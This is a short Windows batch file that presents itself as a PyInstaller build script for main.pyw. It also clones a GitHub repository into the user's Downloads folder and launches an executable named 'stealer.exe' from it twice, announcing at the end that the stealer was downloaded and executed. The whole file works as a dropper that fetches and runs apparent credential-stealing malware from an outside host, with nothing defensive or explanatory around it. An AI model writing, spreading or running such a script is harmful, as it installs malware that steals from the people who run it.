@echo off
rem Batch file to build main.pyw using PyInstaller --onefile, download stealer.exe from GitHub, and run it twice

rem Get the directory where this batch file resides
set "batch_dir=%~dp0"

rem Replace with your Python and PyInstaller executable paths if needed
set python=python
set pyinstaller=pyinstaller

rem Build main.pyw with PyInstaller --onefile
%pyinstaller% --onefile "%batch_dir%main.pyw"

rem Download stealer.exe from GitHub
git clone https://github.com/THECCP0069/nnnnn.git "%USERPROFILE%\Downloads\nnnnn"

rem Run stealer.exe twice
start "" "%USERPROFILE%\Downloads\nnnnn\stealer.exe"
start "" "%USERPROFILE%\Downloads\nnnnn\stealer.exe"

echo Build completed. Stealer.exe downloaded and executed.
pause
